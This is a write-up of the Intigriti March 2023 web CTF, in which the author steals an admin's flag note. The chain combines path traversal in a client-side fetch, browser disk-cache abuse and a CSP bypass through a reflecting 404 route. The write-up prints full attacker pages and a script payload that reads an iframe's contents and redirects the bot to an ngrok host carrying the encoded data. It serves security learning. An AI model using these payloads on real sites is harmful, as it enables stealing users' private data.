# Intigirit Challenge

The challenge can be found here: https://challenge-0323.intigriti.io/
We are tasked with hacking the flag from the admin account. "The admin user has a note with the flag." The authors also provide us with the source code for the CTF.

## Source Code review

We are provided with the NodeJS application, with file-structure like so:
    
```bash!
├── README.md
├── app
│   ├── docker-compose.yml
│   └── www
│       ├── Dockerfile
│       ├── app.js # server-side
│       ├── bot.js # server-side
│       ├── node_modules # server-side
│       ├── package-lock.json # server-side
│       ├── package.json # server-side
│       ├── static
│       │   ├── challenge # client-side
|       |        ├── app.js
|       |        ├── exp.js
|       |        ├── note.gif
|       |        ├── noteico.png
|       |        ├── notes.js
|       |        ├── purify.js
|       |        ├── style.css
|       |        └── view.js
│       │   ├── index.html # client-side
│       │   └── public # client-side
│       └── views # client-side
│           ├── create.ejs 
│           ├── index.ejs 
│           └── note.ejs 
```  




### Server-Side

We start the source-code review by reading the app.js file provided in `app/www`. One can quickly notice these snippets:


```javascript!
// Clear the runtime DB every 1 hrs
setInterval(() => {
  notes.clear();
  allPosts = Object.create(null);
  console.log("[🧹] DB cleared 😏");
}, 3600000);

/* snip */

// The CSP policy
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; style-src fonts.gstatic.com fonts.googleapis.com 'self' 'unsafe-inline';font-src fonts.gstatic.com 'self'; script-src 'self'; base-uri 'self'; frame-src 'self'; frame-ancestors 'self';  object-src 'none';"
  );
  next();
});

```

Having the CSP in the code means we will have to bypass it somehow, and at some point, an XSS attack will come into play.

> Spolier-Alert: Nope, almost XSS but no.

The code also creates session tokens for the users, which are needed to fetch the correct notes. The code also creates session tokens for the users, which are needed to fetch the correct notes. We are also using [Embedded JavaScript templates (ejs)](https://www.npmjs.com/package/ejs), so it's good to be on the lookout for `<%-value%>`

> The code assigned each note a uuid() value for noteIDs, which got a little annoying, so I changed the code to set a simple integer value to the noteID.

```javascript
// note ID simple
let noteIdCounter = 1

// route to create a new note
app.post("/create", (req, res) => {
  const note = req.body.note;

    /* snip */

    //noteId = uuid();
	noteId = noteIdCounter++;
```

The code provides us with these endpoints:

1. `notes` GET
2. `create` GET | POST
3. `/note/:id` GET
4. `visit` GET
5. `debug/52abd8b5-3add-4866-92fc-75d2b1ec1938/:id` GET
6. `*` GET

The first key insights on **Server-Side Code** are: 
1. `note/:id` doesn't have input sanitization on`:id` and, unlike the `/notes` doesn't have a check for a session token, let alone a check for whether or that note belongs to the session. 
2. `/debug/52abd8b5-3add-4866-92fc-75d2b1ec1938` endpoint shouldn't be available on the production env, but it is and lacks the same defenses as the `note/:id` endpoint.
3. The `visit` end point is where the bot is initialized. The bot uses the Puppeteer package to run a headless Chrome browser.
4. The handle-all endpoint `*` also reflects the user input in the response. The input is not sanitized. 

> Even though the 3rd point looks a little irrelevant, it's the first step in exploiting the cache issue, as hinted by the second hint here: https://twitter.com/intigriti/status/1644358672468901889

But most importantly, the note cannot be accessed on both `note/:id` and `debug/<hash>/: id` because of the header `mode: read` requirement. 


```javascript!
app.get("/note/:id", (req, res) => {
  // TODO: Congifure CORS and setup an allowList
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.setHeader("content-type", "text/plain"); // no xss
	console.log(getPostByID(req.params.id).note)
	console.log(req.params.id)
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.render("note", { title: getPostByID(req.params.id).title });
  }
});

/* snip */

app.get("/debug/sd/:id", (req, res) => {
  let mode = req.headers["mode"];
  if (mode === "read") {
    res.send(getPostByID(req.params.id).note);
  } else {
    return res.status(404).send("404");
  }
});

```

**There is also no possibility of triggering an XSS on the `note/:id` and `debug` endpoint because of this code snippet:**

```javascript!
res.setHeader("content-type", "text/plain"); // no xss
```


<sd>
<details>
  <summary>What happens when not using the Client-Side script</summary>

If you try to access the endpoint using the `http://127.0.0.1/note/1?id=1`
    
![](https://i.imgur.com/2wz314o.png) 
</details>
</sd>

### Client-Side

The first key insights on **Client-Side Code** are: 
1. There is a file named `exp.js` probably to hint at how the CSP will be bypassed.
2. `view.js` lacks input sanitization on the `id` param and can help us do injections or file inclusions. Also, uses `fetch` :P

> Will also help us to exploit the Cache. Hinted in the second hint: https://twitter.com/intigriti/status/1644358672468901889. This actually helped me find this writeup: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote

## What and how to exploit

### Agenda
The idea of the CTF is simple: steal the `noteID` of the flag note that the bot creates. (Since the cookies are protected and are not required to  see the note ID)

1. Create a note with JS
1. Make the bot visit it
1. The JS steals the noteID

> well, if only it was this simple.

### Exploitation

1. CSP which prevents the use of external JS or inline `script-src`, so you are restricted with things, you can use as payload.

> Evaulating the CSP using Google CSP Evaluator:  https://csp-evaluator.withgoogle.com/

![](https://i.imgur.com/u9pbmd6.png)

2. We can make a note and use it in line `script-src` to call it, but it cannot be fetched without the required `mode: read` headers.

#### Part1

Let's try solving the ability to fetch the note.

>   I was able to do it when the second hint was provided. The thinking was developed once I knew what had to be done, and then I started seeing the clues.

The authors could have simply used the endpoint to `node/:id` to fetch the note, but there was a requirement for the header `mode: read`, and hence the client-side code was used, which utilized `fetch`. This was done to introduce a vuln intentionally:

> As a interesting point of disk cache, the cache includes not only the HTTP response rendered to a web page, but also those fetched with fetch. In other words, if you access the URL for a fetched resource, the browser will render the resource on the page.
> **Source**: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote

Armed with this knowledge, let's try and test this scenario out.

**Step1: Let's make a note with HTML in it.**

![](https://i.imgur.com/ROrqrMK.png)


We know it will render with `note/:id` path because of `fetch` in `view.js`, **BUT** when opened using the `debug path`. We need the headers to do so.

![](https://i.imgur.com/KENFgJc.png)


> The 404 using the debug route

![](https://i.imgur.com/NIrKNC3.png)


> I changed the code to make it easy to debug with integers as `noteIDs`

**Step2: Abusing the cache to add headers to the `debug/sd/:id`**  

Using the 2nd point in the client-side code review, let's include the `note1` using the debug path.

> Remember how we visited `debug/sd/1` above in previous step. Just after this, visit this path: `note/1?id=../debug/sd/1`

![](https://i.imgur.com/Fcr5G5G.png)


Time to abuse the `cache` as mentioned in the writeup referenced above. Open the console and type `history.back()`

![](https://i.imgur.com/EKpmeFV.png)

#### Scripting part1

We need to make the bot visit `debug_url` first and then `local_inclusion` url. We then make use of `history.go(-2)` to abuse the cache.

Code Snippet: Both these files are hosted on the attacker server.

```html=
<!-- test.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Attacker Page</title>
</head>
<body>
  <script>
    // Define a sleep function that returns a promise that resolves after a specified delay
    const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

    const exploit = async () => {
      const note_id = "1";
      const baseUrl = 'http://127.0.0.1';
      const attacker_url =  'http://127.0.0.1:1337'
      const debug_path = "sd"
      const debug_url = `${baseUrl}/debug/${debug_path}/${note_id}`;
      const local_inclusion = `${baseUrl}/note/${note_id}?id=../debug/${debug_path}/${note_id}`;
      const goBackUrl = `${attacker_url}/goback.html`;

      try {
        console.log('Opening debug_url:', debug_url);
        const newWindow = window.open(debug_url, '_blank');
        await sleep(2000); // Delay for 2 seconds

        console.log('Navigating to local_inclusion:', local_inclusion);
        newWindow.location.href = local_inclusion;
        await sleep(2000); // Delay for 2 seconds

        console.log('Navigating back to debug_url using go-back.html');
        newWindow.location.href = goBackUrl;
        await sleep(2000); // Delay for 2 seconds
      } catch (error) {
        console.error('Error in exploit:', error);
      }
    };

    exploit();
  </script>
</body>
</html>
```

```html=
<!-- goback.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Go Back</title>
</head>
<body>
  <script>
    window.addEventListener('DOMContentLoaded', () => {
      history.go(-2);
    });
  </script>
</body>
</html>
```

Testing it with the `bot.js` provided in the source code and using the `visit?url=http://127.0.0.1:1337/test.html`

![](https://i.imgur.com/kcJpQaf.png)

> The bot visiting the payload.

![](https://i.imgur.com/sLQCZng.png)

> Response from the server


![](https://i.imgur.com/RSGFd8y.png)
> Attacker Server logs


#### Part2

We have the note, which we can use to run the payload to extract the `noteID`. What remains now is the ability to add JS code in the note and bypass CSP.

This is where the `*` end-point will come in handy. We will use `srcipt-src` in the note itself, to run run JS.

```javascript!
<script src="http://127.0.0.1/somethingxyz/,alert(String.fromCharCode(72,101,108,108,111))"></script>

```

![](https://i.imgur.com/PhYF9fQ.png)

![](https://i.imgur.com/5hAOz2r.png)


![](https://i.imgur.com/SIgd4Ur.png)

We are successfully able to execute an alert for the bot. BUT this is where things get very tricky. Remember the code for `*` it has this line as well:

```
return res.send("404 - " + encodeURI(req.path));
```

Not only should your code bypass CSP, but it should also pass this `encodeURI` check. I tried a lot trying to come up with a bypass, but it didn't work.

![](https://i.imgur.com/WmvPyDY.png)


After brainstorming for a while, I thought of using the HTML tags to somehow read the `noteID`.

> Enter the payload

```javascript!
<iframe id="notesframe" src="http://127.0.0.1/notes"></iframe>
<script src="http://127.0.0.1/somethingxyz/,console.log(document.getElementById('notesframe').contentWindow.document.body.innerHTML);" defer></script>
<script src="http://127.0.0.1/somethingxyz/,console.log(1);a=btoa(encodeURIComponent(document.getElementById('notesframe').contentWindow.document.body.querySelector('a').outerHTML));window.location.href='https://825f-2601-197-380-43a0-99e5-8a79-29c7-8ddf.ngrok-free.app/'+a;" defer></script>
```

> In short, the payload retrieves the text content of an anchor tag from an iframe, encodes it, and sends it to the attacker's server by redirecting the browser to the attacker's URL with the encoded data appended. However, the script above won't work right because the `iframe` won't load in time.

![](https://i.imgur.com/5K5xulX.png)


We need to somehow delay the loading of the page for the `iframe` to load. I achived this by loading the `purify.js` and `stylesheets` mutiple times.

```javascript!
<iframe id="notesframe" src="http://127.0.0.1/notes"></iframe>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<link href="/public/bootstrap.min.css" rel="stylesheet">
<link href="/challenge/style.css" rel="stylesheet">
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/challenge/purify.js"></script>
<script src="http://127.0.0.1/somethingxyz/,console.log(document.getElementById('notesframe').contentWindow.document.body.innerHTML);" defer></script>
<script src="http://127.0.0.1/somethingxyz/,console.log(1);a=btoa(encodeURIComponent(document.getElementById('notesframe').contentWindow.document.body.querySelector('a').outerHTML));window.location.href='https://825f-2601-197-380-43a0-99e5-8a79-29c7-8ddf.ngrok-free.app/'+a;" defer></script>

```

![](https://i.imgur.com/Q0wWxam.png)
> what the script will be extracting

**Time to test it on the actualy CTF page.**

![](https://i.imgur.com/9zqKmxw.png)
> Response on the ngrok server

![](https://i.imgur.com/YMkSxxj.png)
> base64 decoded

![](https://i.imgur.com/8m7P3zr.png)
> Flag finally found


Final attacker HTML used:
```javascript!
<!-- test.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Attacker Page</title>
</head>
<body>
  <script>
    // Define a sleep function that returns a promise that resolves after a specified delay
    const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

    const exploit = async () => {
      const note_id = "65b94781-ee96-465d-9ca4-757d234c23d0";
      const baseUrl = 'http://127.0.0.1';
	  const debug_path = "52abd8b5-3add-4866-92fc-75d2b1ec1938"
	  const attacker_url = "https://825f-2601-197-380-43a0-99e5-8a79-29c7-8ddf.ngrok-free.app"
	//  const attacker_url =  'http://127.0.0.1:1337'
	//  const debug_path = "sd"
      const debug_url = `${baseUrl}/debug/${debug_path}/${note_id}`;
      const local_inclusion = `${baseUrl}/note/${note_id}?id=../debug/${debug_path}/${note_id}`;
      const goBackUrl = `${attacker_url}/goback.html`;

      try {
        console.log('Opening debug_url:', debug_url);
        const newWindow = window.open(debug_url, '_blank');
        await sleep(2000); // Delay for 2 seconds

        console.log('Navigating to local_inclusion:', local_inclusion);
        newWindow.location.href = local_inclusion;
        await sleep(2000); // Delay for 2 seconds

        console.log('Navigating back to debug_url using go-back.html');
        newWindow.location.href = goBackUrl;
        await sleep(2000); // Delay for 2 seconds
      } catch (error) {
        console.error('Error in exploit:', error);
      }
    };

    exploit();
  </script>
</body>
</html>
```
